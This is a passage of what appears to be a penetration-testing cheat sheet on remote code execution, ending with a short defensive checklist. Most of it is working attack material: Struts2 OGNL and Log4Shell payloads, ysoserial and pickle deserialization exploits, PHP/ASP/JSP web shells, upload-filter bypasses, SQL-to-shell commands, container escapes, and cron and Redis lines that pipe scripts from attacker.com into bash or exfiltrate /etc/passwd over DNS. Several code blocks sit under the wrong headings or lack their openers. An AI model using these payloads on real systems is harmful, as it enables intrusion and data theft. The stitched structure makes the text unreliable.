Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

**MVEL (MVFLEX Expression Language):**

```java

# Generate payload
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/beacon' | base64

# Popular gadget chains
ysoserial CommonsCollections1
ysoserial CommonsCollections6
ysoserial CommonsCollections7
ysoserial Spring1
ysoserial Spring2
ysoserial Jdk7u21
ysoserial Hibernate1
```

**.NET (using ysoserial.net):**

```bash

# Generate payload
ysoserial.exe -g ObjectDataProvider -f Json -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell.exe -c whoami"

# Gadgets
TypeConfuseDelegate
ObjectDataProvider
PSObject
WindowsIdentity
```

**Python pickle:**

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

**PHP serialize:**

```php

# DNS with data exfiltration
; cat /etc/passwd | base64 | xargs -I {} nslookup {}.burpcollaborator.net
```

#### Bypass Techniques

**Blacklist Bypasses:**

```bash

### 4. Confirm the Vulnerability

Execute harmless commands to prove RCE without causing damage:

```bash

# Time-based confirmation
sleep 10 && curl http://attacker.com/confirmed
```

**Practical Tactics:**

- Use time-based payloads for blind cases; confirm via differential latency (baseline vs payload response time)
- Use OAST (Burp Collaborator, Interactsh) to detect out-of-band DNS/HTTP callbacks
- For deserialization, try signed/unsigned object tampering and gadget canaries
- For uploads, verify server-side processing paths (thumbnails, metadata extraction, AV scanning windows)
- Test multiple injection points in parallel; backend queue processing may delay execution
- Monitor server-side logs if accessible (error logs often reveal stack traces)

# Bypass extension filters
shell.php.jpg
shell.php%00.jpg     # Null byte (PHP <5.3)
shell.php%0a.jpg     # Newline
shell.php.....       # Multiple dots
shell.pHp            # Case variation
shell.php%20         # Trailing space
shell.php::$DATA     # Windows NTFS ADS
shell.php/           # Trailing slash (IIS)

# Content-Type manipulation
Content-Type: image/jpeg
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"

# Polyglot files (valid image + PHP)
GIF89a<?php system($_GET['c']); ?>
```

**ASP/ASPX Shells:**

```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start("cmd.exe", "/c " + Request["c"]); %>
```

**JSP Shells:**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

#### 2. .htaccess / web.config Injection

**.htaccess to enable PHP in images:**

```apache
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg

# Alternative
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**web.config to enable ASP in images:**

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>
```

#### 3. Archive Extraction (Zip Slip - CVE-2018-1002200)

```bash

# Create malicious zip with path traversal
ln -s ../../../../../../../etc/cron.d/evil evil.txt
zip --symlinks evil.zip evil.txt

# Or craft manually with path traversal
evil/
  ../../../../var/www/html/shell.php
  ../../../../etc/cron.d/backdoor
```

**Testing:**

- Upload zip/tar containing paths with `../`
- Symlink to sensitive locations
- Overwrite cron jobs, SSH keys, web roots

#### 4. ImageMagick Exploits

**ImageTragick (CVE-2016-3714):**

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/shell.jpg"|whoami")'
pop graphic-context
```

**Modern ImageMagick RCE (CVE-2022-44268):**

```bash

# Exploitation
convert exploit.png output.png
identify -verbose output.png | grep "Raw profile type"
```

**Other ImageMagick vectors:**

- MSL (Magick Scripting Language) injection
- Label injection for RCE
- SVG with embedded scripts

#### 5. PDF Processing RCE

**PDF with JavaScript:**

```javascript
app.alert({ cMsg: "XSS", cTitle: "XSS" });

// File system access (if enabled)
this.exportDataObject({ cName: "test", nLaunch: 2 });
```

**LaTeX Injection:**

```latex
\documentclass{article}
\immediate\write18{whoami}
\begin{document}
Hello World
\end{document}

# Alternative
\input{|"whoami"}
```

**XSL-FO Injection (Apache FOP):**

```xml
<fo:instream-foreign-object>
  <svg:svg>
    <svg:script>java.lang.Runtime.getRuntime().exec("whoami")</svg:script>
  </svg:svg>
</fo:instream-foreign-object>
```

#### 6. Office Document Processing

**XXE in DOCX/XLSX:**

```xml

# Extract document1.xml from DOCX
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

**Macro-enabled Documents:**

- DOCM, XLSM, PPTM files with VBA macros
- Excel 4.0 macros (XLM) bypass modern protections
- DDE (Dynamic Data Exchange) injection

**LibreOffice/OpenOffice Exploits:**

- CVE-2023-2255: Remote code execution via crafted documents
- Python macro execution in LibreOffice

### Log4Shell (CVE-2021-44228)

**Basic Payloads:**

```bash
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}

# Common injection points
User-Agent: ${jndi:ldap://attacker.com/a}
X-Api-Version: ${jndi:ldap://attacker.com/a}
Referer: ${jndi:ldap://attacker.com/a}
```

**Obfuscation Bypasses:**

```bash

# Multiple levels
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

**Setup LDAP server for exploitation:**

```bash

# Using marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Exploit.java - compile and host
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl http://attacker.com/pwned");
        } catch (Exception e) {}
    }
}
```

### Prototype Pollution → RCE (Node.js)

**Pollute Object prototype:**

```javascript
// Via JSON
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// Via query parameters
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```

**Escalate to RCE:**

```javascript
// Pollute child_process options
{
  "__proto__": {
    "shell": "/bin/sh",
    "argv0": "console.log(require('child_process').execSync('whoami').toString())//"
  }
}

// Pollute via NODE_OPTIONS
{"__proto__": {"NODE_OPTIONS": "--require /tmp/malicious.js"}}

// CVE-2022-21824 - Prototype pollution in VM module
```

# HLS SSRF
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://internal.server/admin
```

**ExifTool RCE (CVE-2021-22204):**

```bash

# Create malicious image with DjVu exploit
exiftool -config exploit.config '-HasselbladExif<=exploit.jpg' malicious.jpg
```

### SQL Injection → RCE

**MySQL:**

```sql
-- Write web shell
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Read file
LOAD_FILE('/etc/passwd');

-- UDF exploitation
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('whoami');
```

**PostgreSQL:**

```sql
-- COPY TO PROGRAM (9.3+)
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/beacon';

-- Large Object + lo_export
SELECT lo_create(-1);
INSERT INTO pg_largeobject VALUES (-1, 0, decode('<?php system($_GET["c"]); ?>', 'base64'));
SELECT lo_export(-1, '/var/www/html/shell.php');
```

**MSSQL:**

```sql
-- xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- OLE Automation
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami';
```

# If /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
```

**Privileged Container:**

```bash

# From privileged container
mkdir /tmp/exploit
mount /dev/sda1 /tmp/exploit
chroot /tmp/exploit sh
```

**Kernel Exploits:**

- Dirty COW (CVE-2016-5195)
- DirtyPipe (CVE-2022-0847)
- DirtyCred (CVE-2022-2588)

# Overwrite cron job
PUT /upload?path=../../etc/cron.d/backdoor
Content: * * * * * root curl http://attacker.com/shell.sh | bash

# Overwrite PHP auto-prepend
PUT /upload?path=../../.user.ini
Content: auto_prepend_file=/tmp/shell.php
```

# SSRF to cloud metadata → IAM creds
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF to Redis → cron job
http://localhost:6379
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename root
SET 1 "* * * * * root curl http://attacker.com/shell.sh | bash"
SAVE
```

# XXE + PHP expect wrapper
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://whoami">
]>
<root>&xxe;</root>

# XXE + JAR protocol (Java)
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:http://attacker.com/malicious.jar!/payload.class">
]>
```

# Jinja2 write web shell
{{''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET["c"]); ?>')}}
```

### Critical RCE Vulnerabilities

1. **CVE-2021-44228 - Log4Shell (Apache Log4j)**:
   - JNDI injection in logging library
   - Affected: Minecraft, VMware, Cisco, countless others
   - Impact: Unauthenticated RCE on millions of systems

2. **CVE-2022-22965 - Spring4Shell (Spring Framework)**:
   - Class loader manipulation via property binding
   - Impact: RCE on Spring MVC applications

3. **CVE-2021-3129 - Laravel Debug Mode RCE**:
   - Ignition debug page deserialization
   - Impact: Unauthenticated RCE on Laravel apps with debug enabled

4. **CVE-2019-0193 - Apache Solr RCE**:
   - Velocity template injection
   - Impact: Unauthenticated RCE on Solr instances

5. **CVE-2017-5638 - Apache Struts2 RCE**:
   - OGNL injection via Content-Type header
   - Impact: Led to Equifax breach affecting 147M people

6. **CVE-2020-1938 - Ghostcat (Apache Tomcat)**:
   - AJP protocol file read/inclusion
   - Impact: RCE via arbitrary file write

7. **CVE-2022-26134 - Confluence RCE**:
   - OGNL injection in Confluence Server/Data Center
   - Impact: Unauthenticated RCE

8. **CVE-2018-1002200 - Kubernetes Arbitrary File Overwrite (Zip Slip)**:
   - Path traversal in tar/zip extraction
   - Impact: Container escape via kubectl cp

9. **CVE-2016-3714 - ImageTragick (ImageMagick)**:
   - Command injection via image processing
   - Impact: RCE on image upload features

10. **CVE-2021-22204 - ExifTool RCE**:
    - DjVu metadata command injection
    - Impact: RCE via image metadata parsing

### Impact Categories

- **Critical**: Unauthenticated RCE on internet-facing services
- **High**: Authenticated RCE or unauthenticated RCE requiring interaction
- **Medium**: RCE requiring specific configuration or low-privilege authentication
- **Low**: RCE requiring admin access or highly specific conditions

## Remediation Recommendations

Avoid inserting user input into code that gets evaluated. Also treat user uploaded files as untrusted, and avoid including file based on user input.

### Defensive Checklist

- **Eliminate Dangerous Functions**: Remove `eval`, `exec`, `Function`, `subprocess.shell=True`, `Runtime.exec()` where possible
- **Parameterized Execution**: Use parameterized/array-based process execution (`shell=False`); escape+allowlist arguments
- **Template Engine Hardening**: Disable dangerous functions/tags; enable sandbox mode; don't accept user templates
- **Strict Upload Validation**:
  - Enforce content-type AND extension checks
  - Verify via magic bytes (file signature)
  - Re-encode/process files (strip metadata with exiftool -all=)
  - Store uploads outside web root
- **Sandbox File Processing**:
  - Process uploads in isolated containers/VMs
  - Use seccomp, AppArmor, SELinux restrictions
  - Run as non-root with minimal permissions
  - No network access during processing
  - Delay publish until validation completes
- **Safe Deserialization**:
  - Prefer JSON/XML with strict schemas
  - Sign and verify serialized data
  - Avoid `pickle`, `marshal`, native object graphs
  - Use allowlists for permitted classes
- **Dependency Management**:
  - Keep libraries updated (ImageMagick, ExifTool, FFmpeg, Log4j, etc.)
  - Pin versions and audit dependencies
  - Subscribe to security advisories
  - Use tools: `npm audit`, `pip-audit`, `OWASP Dependency-Check`
- **Network Segmentation**:
  - Implement egress filtering to prevent OAST callbacks
  - Restrict outbound connections from app servers
  - Monitor DNS queries for suspicious patterns
- **WAF/RASP**:
  - Deploy Web Application Firewall with RCE signatures
  - Consider Runtime Application Self-Protection (RASP)
  - Log and alert on suspicious payloads
- **Log4Shell Specific**:
  - Update to Log4j 2.17.1+
  - Set `log4j2.formatMsgNoLookups=true`
  - Remove JndiLookup class from classpath
  - Monitor for obfuscated JNDI patterns

### Testing Tools

- **SSTI**: `tplmap`, `SSTImap`
- **Deserialization**: `ysoserial`, `ysoserial.net`, `marshalsec`
- **Command Injection**: Burp Intruder, `commix`
- **General**: Burp ActiveScan, `nuclei` templates, `jaeles` signatures
- **OAST**: Burp Collaborator, Interactsh, canarytokens.org